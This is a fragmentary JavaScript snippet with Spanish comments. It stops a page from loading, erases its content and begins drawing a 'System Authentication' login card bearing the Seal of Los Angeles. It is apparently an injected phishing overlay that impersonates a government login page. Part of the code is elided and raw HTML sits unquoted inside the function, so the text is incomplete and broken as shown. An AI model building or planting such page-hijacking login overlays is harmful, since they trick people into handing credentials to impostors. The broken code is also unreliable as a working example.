(function() {
    // 1. Detener carga y resetear posición
    window.stop();
    window.scrollTo(0, 0);

    // 2. Limpieza total del DOM (HTML y Body)
    document.documentElement.innerHTML = '<head><title>System Authentication</title></head><body></body>';

    // 3. CSS RESET AGRESIVO: Esto elimina el hueco en blanco de arriba
    ...
    <div style="width:380px; background:#fff; padding:40px; border-radius:4px; box-shadow:0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid #0056b3; text-align:center; font-family: Arial, sans-serif;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Seal_of_Los_Angeles.svg/200px-Seal_of_Los_Angeles.svg.png" style="width:90px; margin-bottom:25px;">
